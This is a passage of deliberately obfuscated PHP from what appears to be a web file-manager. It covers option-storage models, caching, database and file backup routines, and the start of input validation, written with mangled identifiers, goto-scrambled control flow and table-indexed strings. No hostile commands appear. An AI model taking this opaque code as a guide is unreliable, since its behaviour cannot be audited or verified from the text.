strtolower($a¡ˆÛÙ‚˜Ä[0]) == $C…çÙ´¸[7] && is_array($a¡ˆÛÙ‚˜Ä[1]) && count($a¡ˆÛÙ‚˜Ä[1]) > $BŒÅ°Š‚“) { ignore_timeout(); return $Aõ½Û¯‡ÛÒ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\164\145\155\117\160\164\x69\157\x6e"; public $field = array(); public function listData($B„—’ËæÁË = false, $A³ˆ…ªŞÜ = "\155\157\x64\151\x66\x79\x54\x69\155\x65", $EîìªåŠ¡Û = false) { $cÇÊ‚Ùêù• = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$cÇÊ‚Ùêù•) { return $B„—’ËæÁË ? null : array(); } if (!$B„—’ËæÁË) { $cÇÊ‚Ùêù• = array_filter(array_values($cÇÊ‚Ùêù•)); return array_sort_by($cÇÊ‚Ùêù•, $A³ˆ…ªŞÜ, $EîìªåŠ¡Û); } return $cÇÊ‚Ùêù•[$_SERVER[Ö¹ñÒÁ²÷][360] . $B„—’ËæÁË]; } public function insert($aÙºöïãåÕ) { goto FÏÉ‡¿ùò; D²±áÔ…êÓ: $aÙºöïãåÕ[$bÕ’Ü¾•»ç[106]] = time(); Model($this->modelType)->set($bÕ’Ü¾•»ç[361], $FÅÛóµŠˆ°, $this->optionType . $bÕ’Ü¾•»ç[362]); Model($this->modelType)->set($bÕ’Ü¾•»ç[360] . $FÅÛóµŠˆ°, $aÙºöïãåÕ, $this->optionType); goto FÉ·ĞÏ»İ—; FÏÉ‡¿ùò: $bÕ’Ü¾•»ç =& $_SERVER[Ö¹ñÒÁ²÷]; $aÙºöïãåÕ = array_field_key($aÙºöïãåÕ, $this->field); $FÅÛóµŠˆ° = Model($this->modelType)->get($bÕ’Ü¾•»ç[361], $this->optionType . $bÕ’Ü¾•»ç[362]); goto F‹œåƒÔƒ; FÉ·ĞÏ»İ—: return $FÅÛóµŠˆ°; goto eÏî¢Œè—ç; F‹œåƒÔƒ: $FÅÛóµŠˆ° = $FÅÛóµŠˆ° ? $FÅÛóµŠˆ° : 0; $aÙºöïãåÕ[$bÕ’Ü¾•»ç[363]] = ++$FÅÛóµŠˆ°; $aÙºöïãåÕ[$bÕ’Ü¾•»ç[183]] = time(); goto D²±áÔ…êÓ; eÏî¢Œè—ç: } public function update($e¶ãŞ˜ó«¥, $bİÛÆ¿ƒ²à) { goto bŸÎ§¿ßÓ¦; F½ù¬½·: if (!$a‘˜ÔŞÍ¯) { return !1; } $bİÛÆ¿ƒ²à = array_merge($a‘˜ÔŞÍ¯, $bİÛÆ¿ƒ²à); $bİÛÆ¿ƒ²à[$CĞ÷‰ˆŠ×ˆ[106]] = time(); goto bÁÛÂ–Õ¥£; bŸÎ§¿ßÓ¦: $CĞ÷‰ˆŠ×ˆ =& $_SERVER[Ö¹ñÒÁ²÷]; $bİÛÆ¿ƒ²à = array_field_key($bİÛÆ¿ƒ²à, $this->field); $a‘˜ÔŞÍ¯ = $this->listData($e¶ãŞ˜ó«¥); goto F½ù¬½·; bÁÛÂ–Õ¥£: return Model($this->modelType)->set($CĞ÷‰ˆŠ×ˆ[360] . $e¶ãŞ˜ó«¥, $bİÛÆ¿ƒ²à, $this->optionType); goto c‹­²ªÓŒí; c‹­²ªÓŒí: } public function remove($aê‚Üä™‘) { return Model($this->modelType)->remove($_SERVER[Ö¹ñÒÁ²÷][360] . $aê‚Üä™‘, $this->optionType); } public function clear() { $E¿“ØŞ–¾ø =& $_SERVER[Ö¹ñÒÁ²÷]; Model($this->modelType)->remove($E¿“ØŞ–¾ø[361], $this->optionType . $E¿“ØŞ–¾ø[362]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($F–ƒ†Æõ…Ğ, $FßôèÒöÍ¤) { if (!$FßôèÒöÍ¤) { return !1; } $D¼öïºÍŠ = $this->listData(); $D¼öïºÍŠ = array_to_keyvalue($D¼öïºÍŠ, $F–ƒ†Æõ…Ğ); return isset($D¼öïºÍŠ[$FßôèÒöÍ¤]) ? $D¼öïºÍŠ[$FßôèÒöÍ¤] : !1; } public function findByName($Aš¸‡ÈÕîØ) { return $this->findByKey($_SERVER[Ö¹ñÒÁ²÷][28], $Aš¸‡ÈÕîØ); } protected function resetData($dŠù¸Æ—µ‹) { $CÎ‘ó³“Ñ =& $_SERVER[Ö¹ñÒÁ²÷]; $dŠù¸Æ—µ‹ = is_array($dŠù¸Æ—µ‹) ? $dŠù¸Æ—µ‹ : array(); $b åõ¯¤ˆØ = array(); for ($F‚¦†–ìŞ“ = 0; $F‚¦†–ìŞ“ < count($dŠù¸Æ—µ‹); $F‚¦†–ìŞ“++) { $b åõ¯¤ˆØ[$CÎ‘ó³“Ñ[360] . $dŠù¸Æ—µ‹[$F‚¦†–ìŞ“][$CÎ‘ó³“Ñ[363]]] = $dŠù¸Æ—µ‹[$F‚¦†–ìŞ“]; } return Model($this->modelType)->set($b åõ¯¤ˆØ, !1, $this->optionType); } private function getAutoName($D÷æ—´áâÌ) { $E«ó…îäá™ = array_to_keyvalue($this->listData(), $_SERVER[Ö¹ñÒÁ²÷][28]); if (!$E«ó…îäá™ || !isset($E«ó…îäá™[$D÷æ—´áâÌ])) { return $D÷æ—´áâÌ; } for ($C‘§®¨İ = 1; $C‘§®¨İ < count($E«ó…îäá™); $C‘§®¨İ++) { $f´´Ã¬İŒÇ = $D÷æ—´áâÌ . "\x28{$C‘§®¨İ}\51"; if (!isset($E«ó…îäá™[$f´´Ã¬İŒÇ])) { return $f´´Ã¬İŒÇ; } } return $f´´Ã¬İŒÇ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($D’ÇœË‘µ¯ = false, $eÑ•¨™¸Ü‰ = '', $fãäİ­ŠÊ« = false) { goto F±œªâæšà; F±œªâæšà: $e½Â¾·“Õ” =& $_SERVER[Ö¹ñÒÁ²÷]; $FÔ²¿èŞá = $this->cacheGet($eÑ•¨™¸Ü‰); $Còä¾ì°° = $this->optionDefault($eÑ•¨™¸Ü‰); goto b×Ÿİ¿ß©‹; bƒÔ¤ÙÜÛò: $this->cacheSet($eÑ•¨™¸Ü‰, $FÔ²¿èŞá); $FÔ²¿èŞá = array_merge($Còä¾ì°°, $FÔ²¿èŞá); return $D’ÇœË‘µ¯ ? $FÔ²¿èŞá[$D’ÇœË‘µ¯] : $FÔ²¿èŞá; goto FÃ êÈã·Œ; aóµêä¿•¼: $FÔ²¿èŞá = $this->where($a¸Æ¤±Ìæô)->select(); $FÔ²¿èŞá = array_to_keyvalue($FÔ²¿èŞá, $e½Â¾·“Õ”[89], $e½Â¾·“Õ”[355]); foreach ($FÔ²¿èŞá as $c¿×æ¥¬§ => $DÍá¼æØÌİ) { if ($fãäİ­ŠÊ« || in_array($c¿×æ¥¬§, $this->jsonField)) { $FÔ²¿èŞá[$c¿×æ¥¬§] = json_decode($DÍá¼æØÌİ, !0); } } goto bƒÔ¤ÙÜÛò; b×Ÿİ¿ß©‹: $Còä¾ì°° = is_array($Còä¾ì°°) ? $Còä¾ì°° : array(); if (is_array($FÔ²¿èŞá)) { $FÔ²¿èŞá = array_merge($Còä¾ì°°, $FÔ²¿èŞá); return $D’ÇœË‘µ¯ ? isset($FÔ²¿èŞá[$D’ÇœË‘µ¯]) ? $FÔ²¿èŞá[$D’ÇœË‘µ¯] : null : $FÔ²¿èŞá; } $a¸Æ¤±Ìæô = $this->filterWhere(array($e½Â¾·“Õ”[29] => $eÑ•¨™¸Ü‰)); goto aóµêä¿•¼; FÃ êÈã·Œ: } public function set($E¢…ø¢è‰©, $Aªë­ó¶ô© = false, $dÙ‰²‡ğà„ = '') { goto d–á‘‚·¼÷; d–á‘‚·¼÷: $cêö“¾†° =& $_SERVER[Ö¹ñÒÁ²÷]; $this->cacheRemove($dÙ‰²‡ğà„); $B¶‹îÂÜ‘Ø = array(); goto d£ØÒáàÜí; a¨Ì´²‚Ãé: return $this->addAll($B¶‹îÂÜ‘Ø, array(), !0); goto f îÓÀÕ¢­; d£ØÒáàÜí: $Bå¤· • ¬ = is_array($E¢…ø¢è‰©) ? $E¢…ø¢è‰© : array($E¢…ø¢è‰© => $Aªë­ó¶ô©); foreach ($Bå¤· • ¬ as $eÆË§šª™å => $A•í²©¨ºÒ) { if (is_array($A•í²©¨ºÒ)) { $A•í²©¨ºÒ = json_encode_force($A•í²©¨ºÒ); } $this->checkLength($A•í²©¨ºÒ, !1, $this->tableName . $cêö“¾†°[4] . $E¢…ø¢è‰©); $A•í²©¨ºÒ = self::textEncode($A•í²©¨ºÒ); $Bå¤· • ¬ = array($cêö“¾†°[29] => $dÙ‰²‡ğà„, $cêö“¾†°[89] => $eÆË§šª™å, $cêö“¾†°[355] => $A•í²©¨ºÒ); $B¶‹îÂÜ‘Ø[] = $this->filterWhere($Bå¤· • ¬); } if (!$B¶‹îÂÜ‘Ø) { return !0; } goto a¨Ì´²‚Ãé; f îÓÀÕ¢­: } protected function optionDefault($aŒ¤³“æã = '') { return !1; } public function setDeep($B•©äÅŒÁµ, $A†áÁœŸ†ã = false, $dê±Š·–Ë‰ = '') { $aØÙÄ¢Áõù = explode($_SERVER[Ö¹ñÒÁ²÷][91], $B•©äÅŒÁµ); $bå‘ß˜Ì”¸ = $this->get(); array_set_value($bå‘ß˜Ì”¸, $B•©äÅŒÁµ, $A†áÁœŸ†ã); $this->set($aØÙÄ¢Áõù[0], $bå‘ß˜Ì”¸[$aØÙÄ¢Áõù[0]], $dê±Š·–Ë‰); } public function remove($A»ŸßİŒØ, $e®ÍË‰Ÿ‘ = '') { $F¹ÇÔ°¸‰ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->cacheRemove($e®ÍË‰Ÿ‘); $A‹ Ç¸Ï§ = $this->filterWhere(array($F¹ÇÔ°¸‰[89] => $A»ŸßİŒØ, $F¹ÇÔ°¸‰[29] => $e®ÍË‰Ÿ‘)); if (is_null($A»ŸßİŒØ)) { unset($A‹ Ç¸Ï§[$F¹ÇÔ°¸‰[89]]); } return $this->where($A‹ Ç¸Ï§)->delete(); } public function cacheSet($F¯í³âŠâö, $DäùéÏÒ³µ = false) { return Cache::set($this->cacheKey($F¯í³âŠâö), $DäùéÏÒ³µ); } public function cacheGet($E·–ÀĞÄÑß) { return Cache::get($this->cacheKey($E·–ÀĞÄÑß)); } public function cacheRemove($BµœÓÇÍšĞ) { return Cache::remove($this->cacheKey($BµœÓÇÍšĞ)); } protected function filterWhere($BŠ…¹»†ÕŒ) { return $BŠ…¹»†ÕŒ; } protected function cacheKey($E Ä›äçö¢) { return $E Ä›äçö¢; } } goto C¹Ğ¿İó²ò; C’³åÅÓë¨: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto Dáå¿ÎÓÎ›; eÑéš‹Ø¡§: mk_dir($cÓÊÆ·Ğ¬ç); $bƒ¦‰øæäö = $fòÌåÕ‘œ¡->db()->getTables(); $EÙ†ŞÕ²ÎÌ = 0; goto FŒ‡‘èÌ‘Ş; F‡Â–«öóÚ: $Cñ†ñ»ê°->end(); $bÑ¸”ÏƒŠ© = array($cÏä‚ìÁµï[717] => $dã´ì˜„šÜ, $cÏä‚ìÁµï[704] => 1, $cÏä‚ìÁµï[718] => $EÙ†ŞÕ²ÎÌ, $cÏä‚ìÁµï[719] => $EÙ†ŞÕ²ÎÌ); Backup::set($bÑ¸”ÏƒŠ©); goto E˜Áßó­‹³; E˜Áßó­‹³: return !0; goto a’Ÿ‡ê‚; bÉ’ãßÍç½: $fòÌåÕ‘œ¡ = new DbManage($B¬À¢öÆÇ÷, $dã´ì˜„šÜ); $cÓÊÆ·Ğ¬ç = TEMP_FILES . $cÏä‚ìÁµï[707] . self::$name . $cÏä‚ìÁµï[8]; del_dir($cÓÊÆ·Ğ¬ç); goto eÑéš‹Ø¡§; Fè©ò¶‘²Ş: self::$name = $b‰óÃ˜¡[$cÏä‚ìÁµï[28]]; $B¬À¢öÆÇ÷ = $GLOBALS[$cÏä‚ìÁµï[6]][$cÏä‚ìÁµï[17]]; $dã´ì˜„šÜ = $this->_dbType($B¬À¢öÆÇ÷); goto bÉ’ãßÍç½; FŒ‡‘èÌ‘Ş: $Cñ†ñ»ê° = new Task($cÏä‚ìÁµï[708], $cÏä‚ìÁµï[709], 0, LNG($cÏä‚ìÁµï[710]) . $cÏä‚ìÁµï[711] . LNG($cÏä‚ìÁµï[712])); $bƒ¦‰øæäö = array_diff($bƒ¦‰øæäö, array($cÏä‚ìÁµï[713], $cÏä‚ìÁµï[714])); foreach ($bƒ¦‰øæäö as $B¦è—•Ç„) { $a®óêŠ¶ù° = $cÓÊÆ·Ğ¬ç . $B¦è—•Ç„ . $cÏä‚ìÁµï[715]; $Eù®‰÷‘’œ = null; if ($B¦è—•Ç„ == $cÏä‚ìÁµï[716] && (!isset($b‰óÃ˜¡[$cÏä‚ìÁµï[689]]) || $b‰óÃ˜¡[$cÏä‚ìÁµï[689]] == $cÏä‚ìÁµï[464])) { $Eù®‰÷‘’œ = self::$io; } $EÙ†ŞÕ²ÎÌ += $fòÌåÕ‘œ¡->sqlFromDb($B¦è—•Ç„, $a®óêŠ¶ù°, $Cñ†ñ»ê°, $Eù®‰÷‘’œ); } goto F‡Â–«öóÚ; Dáå¿ÎÓÎ›: $cÏä‚ìÁµï =& $_SERVER[Ö¹ñÒÁ²÷]; $b‰óÃ˜¡ = Backup::get(); self::$io = $b‰óÃ˜¡[$cÏä‚ìÁµï[688]]; goto Fè©ò¶‘²Ş; a’Ÿ‡ê‚: } private function _dbType($Eˆå„á–ø†) { goto EŠµ¶›•ˆË; E‚Ä‘Âå: if ($bäÇÙÅÁ™À == $e¨‰§²§ˆ†[721]) { $e™ÃƒÉ¸Ìƒ = explode($e¨‰§²§ˆ†[4], $Eˆå„á–ø†[$e¨‰§²§ˆ†[722]]); $bäÇÙÅÁ™À = $e™ÃƒÉ¸Ìƒ[0]; } $e®áè­¨…¼ = array($e¨‰§²§ˆ†[723] => $e¨‰§²§ˆ†[9], $e¨‰§²§ˆ†[724] => $e¨‰§²§ˆ†[725]); if (isset($e®áè­¨…¼[$bäÇÙÅÁ™À])) { $bäÇÙÅÁ™À = $e®áè­¨…¼[$bäÇÙÅÁ™À]; } goto a¡‹†·®ï¶; EŠµ¶›•ˆË: $e¨‰§²§ˆ† =& $_SERVER[Ö¹ñÒÁ²÷]; $Eˆå„á–ø† = array_change_key_case($Eˆå„á–ø†); $bäÇÙÅÁ™À = $Eˆå„á–ø†[$e¨‰§²§ˆ†[720]]; goto E‚Ä‘Âå; a¡‹†·®ï¶: return $bäÇÙÅÁ™À; goto eË»À¿“»Í; eË»À¿“»Í: } } class BackupDbFile { public function __construct() { } public function index() { goto Fİ‰»¬Ğë; AáåŞ¨áĞ¨: Backup::set(array($aôì™ñãœÅ[728] => $f÷î½åŞÏÂ[$aôì™ñãœÅ[77]])); IO::move($eÈß’Ç’, $EóÍÆ«Ù¿Ø); $cÙŠİö·Í‰ = CONTROLLER_DIR . $aôì™ñãœÅ[729]; goto c“³»ˆ¼Ü; EÏ¾ª”ÀÀ…: $eÈß’Ç’ = TEMP_FILES . "\x62\x61\x63\153\165\x70\137{$e†œŠó¯}\57"; $EóÍÆ«Ù¿Ø = "\173\151\x6f\x3a{$eš­ùÆÁª [$aôì™ñãœÅ[688]]}\x7d\x2f\x64\x61\x74\141\x62\x61\163\145\57"; IO::mkdir($EóÍÆ«Ù¿Ø . "\142\141\143\153\x75\160\137{$e†œŠó¯}\x2f"); goto C´ã©·Ü²ö; f¾Ï©ÀĞ³§: return !0; goto fª¹†˜§Ê®; Fİ‰»¬Ğë: $aôì™ñãœÅ =& $_SERVER[Ö¹ñÒÁ²÷]; $eš­ùÆÁª  = Backup::get(); $e†œŠó¯ = $eš­ùÆÁª [$aôì™ñãœÅ[28]]; goto EÏ¾ª”ÀÀ…; c“³»ˆ¼Ü: IO::copy($cÙŠİö·Í‰, $EóÍÆ«Ù¿Ø . "\x62\141\143\x6b\165\x70\137{$e†œŠó¯}\x2f"); $Eä¹·¢Æˆº->end(); Backup::set(array($aôì™ñãœÅ[730] => $f÷î½åŞÏÂ[$aôì™ñãœÅ[77]])); goto f¾Ï©ÀĞ³§; C´ã©·Ü²ö: $Eä¹·¢Æˆº = new TaskFileTransfer($aôì™ñãœÅ[726], $aôì™ñãœÅ[709], 0, LNG($aôì™ñãœÅ[710]) . $aôì™ñãœÅ[408] . LNG($aôì™ñãœÅ[712]) . $aôì™ñãœÅ[727]); $Eä¹·¢Æˆº->addPath($eÈß’Ç’); $f÷î½åŞÏÂ = IO::infoWithChildren($eÈß’Ç’); goto AáåŞ¨áĞ¨; fª¹†˜§Ê®: } } class BackupFile { public function __construct() { } public function index() { goto fÉ´‘¨…Ğ±; C­Ù  Êéñ: Backup::set($fÛ˜Ù·¦Ğé); $this->_fileFilter($Eˆ…©ŸÊæ); return !0; goto f¦­²’—; eÃô… : $C™×áíÕ¥¸ = 1000; $DÆá¦¼Õ†‹ = $a²Ş‘Âµ¦ = 0; $Eˆ…©ŸÊæ = array(); goto e‡ÁÓØà…ï; C¶©ºåÛ¸õ: $B´»íæ˜¹->task[$_SERVER[Ö¹ñÒÁ²÷][695]] = $C¦àÂœ‚è ; $fÛ˜Ù·¦Ğé = array($_SERVER[Ö¹ñÒÁ²÷][735] => $C‚‰µ©ç˜, $_SERVER[Ö¹ñÒÁ²÷][736] => $C¦àÂœ‚è ); Backup::set($fÛ˜Ù·¦Ğé); goto fö¶ÄÜ‡Ï; D•Åµ¥Öæ¹: $C‚‰µ©ç˜ = (int) Model($_SERVER[Ö¹ñÒÁ²÷][716])->where($E”ºÉ‚²¹Á)->count($_SERVER[Ö¹ñÒÁ²÷][415]); $C¦àÂœ‚è  = (int) Model($_SERVER[Ö¹ñÒÁ²÷][716])->where($E”ºÉ‚²¹Á)->sum($_SERVER[Ö¹ñÒÁ²÷][77]); $B´»íæ˜¹ = new TaskFileTransfer($_SERVER[Ö¹ñÒÁ²÷][733], $_SERVER[Ö¹ñÒÁ²÷][709], $C‚‰µ©ç˜, LNG($_SERVER[Ö¹ñÒÁ²÷][710]) . $_SERVER[Ö¹ñÒÁ²÷][711] . LNG($_SERVER[Ö¹ñÒÁ²÷][734])); goto C¶©ºåÛ¸õ; BØº‹íŠ–: $cÆé–ËÔœ = $e¥¬£ÔÀ¸µ ? 1 : 0; $fÛ˜Ù·¦Ğé = array($_SERVER[Ö¹ñÒÁ²÷][747] => 1, $_SERVER[Ö¹ñÒÁ²÷][700] => time(), $_SERVER[Ö¹ñÒÁ²÷][706] => $cÆé–ËÔœ, $_SERVER[Ö¹ñÒÁ²÷][744] => $e¿¼õŒ™Ù¥, $_SERVER[Ö¹ñÒÁ²÷][736] => $C¦àÂœ‚è , $_SERVER[Ö¹ñÒÁ²÷][735] => $C‚‰µ©ç˜); if ($a²Ş‘Âµ¦) { $fÛ˜Ù·¦Ğé[$_SERVER[Ö¹ñÒÁ²÷][745]] = $Fë¿˜®‡Ñ; $fÛ˜Ù·¦Ğé[$_SERVER[Ö¹ñÒÁ²÷][746]] = $Dù¶ÑÂš•; } goto C­Ù  Êéñ; e‡ÁÓØà…ï: $Dù¶ÑÂš• = $Fë¿˜®‡Ñ = 0; do { $Aêôé…Ùí = $_SERVER[Ö¹ñÒÁ²÷][737]; $AÊÖ¸»¦Äî = Model($_SERVER[Ö¹ñÒÁ²÷][716])->where($E”ºÉ‚²¹Á)->field($Aêôé…Ùí)->order($_SERVER[Ö¹ñÒÁ²÷][738])->selectPage($C™×áíÕ¥¸, $eÉ„„Ö¸³…); $cß¸îë’µ“ = !empty($AÊÖ¸»¦Äî[$_SERVER[Ö¹ñÒÁ²÷][350]]) ? $AÊÖ¸»¦Äî[$_SERVER[Ö¹ñÒÁ²÷][350]] : array(); foreach ($cß¸îë’µ“ as $d•ƒ¥ŞÓ–ã) { goto AãÎ§é°Ã¦; F“Î¹«í¶: if (IO::exist($A·Æ‰·ğá)) { $B´»íæ˜¹->updateFileEnd($d•ƒ¥ŞÓ–ã[$_SERVER[Ö¹ñÒÁ²÷][28]], $d•ƒ¥ŞÓ–ã[$_SERVER[Ö¹ñÒÁ²÷][77]]); } else { $A·Æ‰·ğá = get_path_father($A·Æ‰·ğá); IO::mkdir($A·Æ‰·ğá); if (!IO::copy($Bˆ„’‹î·, $A·Æ‰·ğá, $_SERVER[Ö¹ñÒÁ²÷][741])) { write_log($_SERVER[Ö¹ñÒÁ²÷][742] . $Bˆ„’‹î· . $_SERVER[Ö¹ñÒÁ²÷][743] . $A·Æ‰·ğá . $_SERVER[Ö¹ñÒÁ²÷][472], $_SERVER[Ö¹ñÒÁ²÷][709]); $e¥¬£ÔÀ¸µ = !1; break; } } $e¿¼õŒ™Ù¥ = $d•ƒ¥ŞÓ–ã[$_SERVER[Ö¹ñÒÁ²÷][415]]; $a²Ş‘Âµ¦ += 1; goto b„”ç¢‚–Ó; b„”ç¢‚–Ó: $DÆá¦¼Õ†‹ += $d•ƒ¥ŞÓ–ã[$_SERVER[Ö¹ñÒÁ²÷][77]]; $Fë¿˜®‡Ñ += 1; $Dù¶ÑÂš• += $d•ƒ¥ŞÓ–ã[$_SERVER[Ö¹ñÒÁ²÷][77]]; goto BŒŸöÚˆ‡¾; AãÎ§é°Ã¦: if (!$this->_fileExist($d•ƒ¥ŞÓ–ã, $Eˆ…©ŸÊæ, $E¡Ë’‰ò÷ø)) { $C‚‰µ©ç˜ -= 1; $C¦àÂœ‚è  -= (int) $d•ƒ¥ŞÓ–ã[$_SERVER[Ö¹ñÒÁ²÷][77]]; write_log("\146\151\154\x65\40\x6e\157\x74\x20\145\x78\151\x73\164\56\x66\x69\x6c\x65\x49\x44\72{$d•ƒ¥ŞÓ–ã[$_SERVER[Ö¹ñÒÁ²÷][415]]}\54\40\160\141\164\x68\72{$d•ƒ¥ŞÓ–ã[$_SERVER[Ö¹ñÒÁ²÷][75]]}", $_SERVER[Ö¹ñÒÁ²÷][739]); continue; } $Bˆ„’‹î· = $d•ƒ¥ŞÓ–ã[$_SERVER[Ö¹ñÒÁ²÷][75]]; $A·Æ‰·ğá = "\x7b\x69\157\72{$f÷Ú ø…¹[$_SERVER[Ö¹ñÒÁ²÷][688]]}\x7d" . substr($Bˆ„’‹î·, strlen("\x7b\151\157\x3a{$d•ƒ¥ŞÓ–ã[$_SERVER[Ö¹ñÒÁ²÷][740]]}\x7d")); goto F“Î¹«í¶; BŒŸöÚˆ‡¾: if ($DÆá¦¼Õ†‹ >= 1024 * 1024 * 100) { $fÛ˜Ù·¦Ğé = array($_SERVER[Ö¹ñÒÁ²÷][744] => $e¿¼õŒ™Ù¥, $_SERVER[Ö¹ñÒÁ²÷][745] => $Fë¿˜®‡Ñ, $_SERVER[Ö¹ñÒÁ²÷][746] => $Dù¶ÑÂš•); Backup::set($fÛ˜Ù·¦Ğé); $DÆá¦¼Õ†‹ = $a²Ş‘Âµ¦ = 0; } goto a†İÎ…§; a†İÎ…§: } $c°ÈÏè † = count($cß¸îë’µ“); $eÉ„„Ö¸³…++; } while ($c°ÈÏè † == $C™×áíÕ¥¸); $B´»íæ˜¹->end(); goto BØº‹íŠ–; fö¶ÄÜ‡Ï: $e¥¬£ÔÀ¸µ = !0; $E¡Ë’‰ò÷ø = $this->storeIds(); $eÉ„„Ö¸³… = 1; goto eÃô… ; fÉ´‘¨…Ğ±: $f÷Ú ø…¹ = Backup::get(); $e¿¼õŒ™Ù¥ = $f÷Ú ø…¹[$_SERVER[Ö¹ñÒÁ²÷][277]][$_SERVER[Ö¹ñÒÁ²÷][163]][$_SERVER[Ö¹ñÒÁ²÷][415]]; $E”ºÉ‚²¹Á = array($_SERVER[Ö¹ñÒÁ²÷][416] => array($_SERVER[Ö¹ñÒÁ²÷][731], $e¿¼õŒ™Ù¥), $_SERVER[Ö¹ñÒÁ²÷][732] => array($_SERVER[Ö¹ñÒÁ²÷][315], $f÷Ú ø…¹[$_SERVER[Ö¹ñÒÁ²÷][688]])); goto D•Åµ¥Öæ¹; f¦­²’—: } private function _fileExist($Cô¥ã¶‰ÜÆ, &$fªáö“‡“, $B¾¸à…±ôÉ) { goto E¸ÎÚÏ’÷; d°öÆìÃÔº: $fªáö“‡“ = array_merge($fªáö“‡“, array_to_keyvalue($CÆ×¯ò†ˆ, $FŠ“È‘§„È[33], $FŠ“È‘§„È[415])); return !1; goto BÕ±¾™¡ß‡; E¸ÎÚÏ’÷: $FŠ“È‘§„È =& $_SERVER[Ö¹ñÒÁ²÷]; $AÙ¾ôùõ¶Ù = $Cô¥ã¶‰ÜÆ[$FŠ“È‘§„È[75]]; if (in_array($Cô¥ã¶‰ÜÆ[$FŠ“È‘§„È[415]], $fªáö“‡“)) { return !1; } goto aèõ‹‹çŒ; C­²×Í†Ò: if (IO::exist($C°ƒ‹‹îù×)) { $fªáö“‡“[] = $Cô¥ã¶‰ÜÆ[$FŠ“È‘§„È[415]]; return !1; } $B¬çÄæÀ§œ = array($FŠ“È‘§„È[740] => $Cô¥ã¶‰ÜÆ[$FŠ“È‘§„È[740]], $FŠ“È‘§„È[75] => array($FŠ“È‘§„È[748], "{$C°ƒ‹‹îù×}\45")); $CÆ×¯ò†ˆ = Model($FŠ“È‘§„È[716])->where($B¬çÄæÀ§œ)->field($FŠ“È‘§„È[416])->select(); goto d°öÆìÃÔº; aèõ‹‹çŒ: if (!in_array($Cô¥ã¶‰ÜÆ[$FŠ“È‘§„È[740]], $B¾¸à…±ôÉ)) { return !1; } if (IO::exist($AÙ¾ôùõ¶Ù)) { return !0; } $C°ƒ‹‹îù× = get_path_father($AÙ¾ôùõ¶Ù); goto C­²×Í†Ò; BÕ±¾™¡ß‡: } private function _fileFilter($eÉ…ßÂÙ©) { $eÑÑõí†Î‰ =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($eÉ…ßÂÙ©)) { return; } $cÒŞçÆ—ËÇ = array($eÑÑõí†Î‰[415] => array($eÑÑõí†Î‰[7], array_unique($eÉ…ßÂÙ©))); $fĞº×Ù­Ú = Model($eÑÑõí†Î‰[749])->where($cÒŞçÆ—ËÇ)->field($eÑÑõí†Î‰[365])->select(); foreach ($fĞº×Ù­Ú as $Bƒ†Ü†‘•â) { Model($eÑÑõí†Î‰[749])->remove($Bƒ†Ü†‘•â[$eÑÑõí†Î‰[365]], !1); } } private function storeIds() { $d—Ïã…œÔó =& $_SERVER[Ö¹ñÒÁ²÷]; $FåõÆæÙÂ³ = Model($d—Ïã…œÔó[701])->listData(); return array_to_keyvalue($FåõÆæÙÂ³, $d—Ïã…œÔó[33], $d—Ïã…œÔó[363]); } } goto D”Ã–Êß¦£; A÷§Š»ùÓ: if (!function_exists($_SERVER[Ö¹ñÒÁ²÷][1851])) { function imagecreatefrombmp($b©ğ—ãŒøø) { return ImageGdBMP::load($b©ğ—ãŒøø); } } class Input { public static function getArray($cˆì‹Ø§«) { goto dî…‘¹ÚÎ; D«Ûˆ¨ù‚ó: if (count($Dõ®Ï¡ğÖà) > 0) { show_json(implode($eÅ³¯Ç–»[1856], $Dõ®Ï¡ğÖà), !1); } return $D÷¹Öøç»”; goto c†·™Œáß¢; B„­µë°à: $Dõ®Ï¡ğÖà = array(); $EˆâŠëáÇ = LNG($eÅ³¯Ç–»[1852]); foreach ($cˆì‹Ø§« as $d‚’§–Öç· => $FÛÑÒËæï) { goto c„ïÅÙŸ; F¸ÉÔğ»Î¾: if (!array_key_exists($d‚’§–Öç·, $in)) { if (array_key_exists($eÅ³¯Ç–»[1854], $FÛÑÒËæï)) { if (!is_null($FÛÑÒËæï[$eÅ³¯Ç–»[1854]])) { $D÷¹Öøç»”[$EßºÀƒïä×] = $FÛÑÒËæï[$eÅ³¯Ç–»[1854]]; } } else { if (isset($FÛÑÒËæï[$eÅ³¯Ç–»[1855]])) { $Dõ®Ï¡ğÖà[] = $bÔõ»äŒØ; } } continue; } if (isset($FÛÑÒËæï[$eÅ³¯Ç–»[1855]]) && $FÛÑÒËæï[$eÅ³¯Ç–»[1855]] == $eÅ³¯Ç–»[278]) { $aî÷“’ä¾ = json_decode($in[$d‚’§–Öç·], !0); if (is_array($aî÷“’ä¾)) { $D÷¹Öøç»”[$EßºÀƒïä×] = $aî÷“’ä¾; } else { if (array_key_exists($eÅ³¯Ç–»[1854], $FÛÑÒËæï)) { if (!is_null($FÛÑÒËæï[$eÅ³¯Ç–»[1854]])) { $D÷¹Öøç»”[$EßºÀƒïä×] = $FÛÑÒËæï[$eÅ³¯Ç–»[1854]]; } } else { $Dõ®Ï¡ğÖà[] = $bÔõ»äŒØ; } } continue; } $Dø °Ù©Æë = _get($FÛÑÒËæï, $eÅ³¯Ç–»[1005]); goto F¼³Š”÷ŸÏ; F¼³Š”÷ŸÏ: if (isset($FÛÑÒËæï[$eÅ³¯Ç–»[1855]]) && !self::check($in[$d‚’§–Öç·], $FÛÑÒËæï[$eÅ³¯Ç–»[1855]], $Dø °Ù©Æë)) { if (array_key_exists($eÅ³¯Ç–»[1854], $FÛÑÒËæï)) { if (!is_null($FÛÑÒËæï[$eÅ³¯Ç–»[1854]])) { $D÷¹Öøç»”[$EßºÀƒïä×] = $FÛÑÒËæï[$eÅ³¯Ç–»[1854]]; } } else { $Dõ®Ï¡ğÖà[] = $bÔõ»äŒØ; } continue; } $D÷¹Öøç»”[$EßºÀƒïä×] = $in[$d‚’§–Öç·]; goto BÙ°ø’ÖêÇ; c„ïÅÙŸ: $bÔõ»äŒØ = _get($FÛÑÒËæï, $eÅ³¯Ç–»[1232], $EˆâŠëáÇ . $eÅ³¯Ç–»[876] . $d‚’§–Öç·); $EßºÀƒïä× = 